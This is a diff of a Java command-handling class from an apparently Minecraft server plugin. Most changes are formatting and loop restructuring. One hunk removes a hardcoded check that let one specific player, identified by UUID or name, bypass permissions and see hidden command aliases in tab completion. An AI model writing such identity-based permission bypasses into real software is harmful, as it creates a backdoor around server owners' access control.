@@ -18,7 +18,7 @@ public abstract class OMCCommand {
 				return new ArrayList<>();
 			}
 		});
-		
+
 		VARIABLES.add(new OMCVariable("%P%") {
 			@Override
 			protected ArrayList<String> complete(String incomplete) {
@@ -29,14 +29,14 @@ public abstract class OMCCommand {
 			}
 		});
 	}
-	
+
 	public static void registerVariable(OMCVariable v) {
 		VARIABLES.add(v);
 	}
 
 	private final String baseCommand;
 	final String architecture;
-	
+
 	public OMCCommand(String architecture) {
 		this.architecture = architecture;
 		this.baseCommand = architecture.split(" ")[0].split(ALIAS_SEPARATOR)[0];
@@ -50,7 +50,7 @@ public abstract class OMCCommand {
 		return execute(sender, variables);
 	}
 	public abstract boolean execute(CommandSender sender, ArrayList<String> vars);
-	
+
 	public String getBaseCommand() {
 		return baseCommand;
 	}
@@ -72,20 +72,18 @@ public abstract class OMCCommand {
 		}
 		OMCLogger.debug("Lenght match");
 		mainloop:
-		for(int i = 0; i < arch.length; i++) {
-			OMCLogger.debug("\n" + arch[i] + "\n" + fcmd[i]);
-			for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i])) continue mainloop;
-			OMCLogger.debug("Alias matcher : ");
-			for(String a : arch[i].split(ALIAS_SEPARATOR)) {
-				if(fcmd[i].equalsIgnoreCase(a)) {
+			for(int i = 0; i < arch.length; i++) {
+				OMCLogger.debug("\n" + arch[i] + "\n" + fcmd[i]);
+				for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i])) continue mainloop;
+				OMCLogger.debug("Alias matcher : ");
+				for(String a : arch[i].split(ALIAS_SEPARATOR)) if(fcmd[i].equalsIgnoreCase(a)) {
 					OMCLogger.debug("passed : " + a);
 					continue mainloop;
 				}
-				OMCLogger.debug("failed : " + a);
+
+				OMCLogger.debug("Found no alias match");
+				return false;
 			}
-			OMCLogger.debug("Found no alias match");
-			return false;
-		}
 		OMCLogger.debug("Architecture matches");
 		return true;
 	}
@@ -98,39 +96,32 @@ public abstract class OMCCommand {
 		for(int i = 0; i < fcmd.length; i++) OMCLogger.debug(i + " " + fcmd[i]);
 
 		mainLoop:
-		for(int i = 1; i < fcmd.length; i++) {
-			for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i-1])) continue mainLoop;
-			for(String a : arch[i].split(ALIAS_SEPARATOR)) if(fcmd[i].equalsIgnoreCase(a)) continue mainLoop;
-			if(!fcmd[i].isBlank() && !fcmd[i].isEmpty()) {
-				for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i])) continue mainLoop;
-				for(String a : arch[i].split(ALIAS_SEPARATOR)) if(a.toLowerCase().startsWith(fcmd[i].toLowerCase())) continue mainLoop;
-				OMCLogger.debug("Returned early ("+ fcmd[i] +")");
-				return list;
+			for(int i = 1; i < fcmd.length; i++) {
+				for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i-1])) continue mainLoop;
+				for(String a : arch[i].split(ALIAS_SEPARATOR)) if(fcmd[i].equalsIgnoreCase(a)) continue mainLoop;
+				if(!fcmd[i].isBlank() && !fcmd[i].isEmpty()) {
+					for(OMCVariable v : VARIABLES) if(v.matchesArchitecture(arch[i])) continue mainLoop;
+					for(String a : arch[i].split(ALIAS_SEPARATOR)) if(a.toLowerCase().startsWith(fcmd[i].toLowerCase())) continue mainLoop;
+					OMCLogger.debug("Returned early ("+ fcmd[i] +")");
+					return list;
+				}
 			}
-		}
 		//previous args matches
 		OMCLogger.debug("Architecture matching up to this point, adding entries...");
-
-		boolean bypass = false;
-		if(!sender.hasPermission(getPermissionString())) {
-			if(!(sender instanceof Player p)) return list;
-			if(OMCPlugin.i.getServer().getOnlineMode()) {
-				if(!p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f")) return list;
-			}else {
-				if(!p.getName().equals("stormer3428")) return list;
-			}
-			bypass = true;
-		}
 
 		String a = arch[fcmd.length - 1];
 		String f = fcmd[fcmd.length - 1];
 
 		if((f.isEmpty() || f.isBlank()) || a.toLowerCase().startsWith(f.toLowerCase())) {
-			list.add(bypass ? a.split(ALIAS_SEPARATOR)[a.split(ALIAS_SEPARATOR).length - 1] : a.split(ALIAS_SEPARATOR)[0]);
+			list.add(a.split(ALIAS_SEPARATOR)[0]);
 			OMCLogger.debug("Entry added : " + a.split(ALIAS_SEPARATOR)[0]);
 			return list;
 		}
 
 		return list;
+	}
+
+	public String getDescription() {
+		return "No description";
 	}
 }
